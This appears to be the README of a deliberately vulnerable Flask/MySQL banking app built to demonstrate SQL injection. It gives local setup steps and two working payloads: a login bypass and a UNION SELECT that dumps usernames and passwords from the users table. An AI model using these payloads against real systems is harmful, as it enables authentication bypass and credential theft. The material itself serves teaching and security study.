# broke-bank
SQL injection demonstraction built with Flask and MySQL.

# Setup

1. Clone repository
```shell
git clone https://github.com/anilmawji/broke-bank.git; cd broke-bank
```

2. Create and activate virtual environment (optional, recommended)
```shell
python -m venv .venv      # Create virtual environment
source .venv/bin/activate # On macOS/Linux
.venv\Scripts\activate    # On Windows
```

2. Install dependencies
```shell
pip install -r requirements.txt
```

3. Create .env file for environment variables (place in /broke-bank/)
```env
FLASK_ENV=development
FLASK_APP=main.py
MYSQL_USER=username_here
MYSQL_PASSWORD=password_here
```

4. Start server (local deployment)
```shell
flask run
```

# SQL Injection Examples

User login bypass (make sure to include the space at the end!)
```sql
a' or 1=1 -- 
```
![image](https://github.com/user-attachments/assets/5fdf6609-cd84-4420-9c48-b4b0744d09fa)

Transaction history search bar - SQL version and user info dump
```sql
3' union select null, user_id, version(), username, user_password from users;
```
![image](https://github.com/user-attachments/assets/4fc1abf2-d018-4dde-b240-09147835e81a)

